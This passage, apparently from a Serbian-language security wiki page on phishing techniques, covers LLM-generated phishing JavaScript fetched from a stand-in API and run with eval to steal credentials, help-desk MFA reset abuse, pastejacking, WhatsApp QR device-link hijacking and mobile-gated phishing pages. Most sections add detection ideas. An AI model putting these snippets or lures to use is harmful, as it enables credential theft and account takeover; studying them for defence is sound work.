3. **Assemble & exec:** konkatenirajte odgovor i izvršite ga (polimorfno pri svakoj poseti):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generisani code personalizuje mamac (npr. LogoKit token parsing) i šalje creds na prompt-hidden endpoint.

**Karakteristike izbegavanja**
- Saobraćaj prolazi kroz dobro poznate LLM domene ili pouzdane CDN proxy-je; ponekad preko WebSockets-a do backend-a.
- Nema statičkog payload-a; maliciozni JS postoji tek nakon renderovanja.
- Nedeterminističke generacije proizvode **jedinstvene stealere po sesiji**.

**Ideje za detekciju**
- Pokrenite sandbox-e sa omogućenim JS-om; označite **runtime `eval`/dinamičko kreiranje skripti poteklo iz LLM odgovora**.
- Potražite front-end POST zahteve ka LLM API-jima neposredno praćene pozivom `eval`/`Function` nad vraćenim tekstom.
- Upozorite na neodobrene LLM domene u client saobraćaju, praćene naknadnim credential POST zahtevima.

---

## MFA Fatigue / Push Bombing Variant – Prisilni reset
Pored klasičnog push-bombing-a, operatori jednostavno **forsiraju novu MFA registraciju** tokom poziva help-desk-u, čime poništavaju korisnikov postojeći token.  Svaki naredni login prompt žrtvi izgleda legitimno.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Pratite AzureAD/AWS/Okta događaje kod kojih se **`deleteMFA` + `addMFA`** dešavaju **u roku od nekoliko minuta sa iste IP adrese**.



## Clipboard Hijacking / Pastejacking

Napadači mogu neprimetno da kopiraju zlonamerne komande u clipboard žrtve sa kompromitovane ili typosquatted web stranice, a zatim da navedu korisnika da ih nalepi u **Win + R**, **Win + X** ili terminal, čime se izvršava proizvoljan kod bez ikakvog preuzimanja ili priloga.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack putem QR social engineering-a
* Lure stranica (npr. lažni “kanal” ministarstva/CERT-a) prikazuje WhatsApp Web/Desktop QR i upućuje žrtvu da ga skenira, čime se napadač neprimetno dodaje kao **linked device**.<sup>[[12]](#references)</sup>
* Napadač odmah dobija uvid u chatove i kontakte sve dok se sesija ne ukloni. Žrtve kasnije mogu videti obaveštenje “new device linked”; defenders mogu tražiti neočekivane device-link događaje ubrzo nakon poseta nepouzdanim QR stranicama.

### Mobile‑gated phishing za zaobilaženje crawler-a/sandbox-a
Operatori sve češće ograničavaju svoje phishing tokove na mobilne uređaje pomoću jednostavne provere uređaja, tako da desktop crawler-i nikada ne dolaze do završnih stranica. Uobičajen obrazac je mala skripta koja proverava postojanje DOM-a sa podrškom za dodir i šalje rezultat server endpoint-u; non‑mobile klijenti dobijaju HTTP 500 (ili praznu stranicu), dok se mobilnim korisnicima prikazuje kompletan tok.<sup>[[7]](#references)</sup>

Minimalni client snippet (tipična logika):
```html
<script src="/static/detect_device.js"></script>
```
Logika u `detect_device.js` (pojednostavljeno):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Ponašanje servera koje se često uočava:
- Postavlja session cookie pri prvom učitavanju.
- Prihvata `POST /detect {"is_mobile":true|false}`.
- Vraća 500 (ili placeholder) za naredne GET zahteve kada je `is_mobile=false`; phishing sadržaj servira samo ako je `true`.

Heuristike za hunting i detekciju:
- urlscan upit: `filename:"detect_device.js" AND page.status:500`
- Web telemetrija: sekvenca `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za non-mobile; legitimne putanje za mobile žrtve vraćaju 200 sa naknadnim HTML/JS sadržajem.
- Blokirati ili detaljno proveriti stranice koje uslovljavaju sadržaj isključivo na osnovu `ontouchstart` ili sličnih provera uređaja.

Saveti za odbranu:
- Pokretati crawlere sa fingerprintima sličnim mobile uređajima i omogućenim JS-om kako bi se otkrio gated sadržaj.
- Upozoriti na sumnjive 500 odgovore nakon `POST /detect` na novoregistrovanim domenima.

## References

- [1] [Generisanje varijacija domena koje se koriste u phishingu (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Pronalaženje phishinga: Alati i tehnike (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Krađa credentials-a i zaobilaženje 2FA pomoću noVNC-a (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Krađa sesija i zaobilaženje 2FA pomoću EvilnoVNC-a (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Kako instalirati i konfigurisati DKIM sa Postfix-om na Debian Wheezy-ju (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Globalni izveštaj Unit 42 o incident response-u za 2025. – izdanje o social engineering-u](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – phishing infrastruktura i heuristike ograničene na mobile uređaje (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Sledeća granica napada runtime assembly: korišćenje LLM-ova za generisanje phishing JavaScript-a u realnom vremenu](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, otmica klikova i TDS: Uvid u ekosistem distribucije malware-a](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Otmica saobraćaja ka Microsoft-ovom windows.com pomoću bitflipping-a (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Ljubav? Zapravo: Lažna dating aplikacija korišćena kao mamac u ciljanoj spyware kampanji u Pakistanu](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC-ovi i uzorci](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
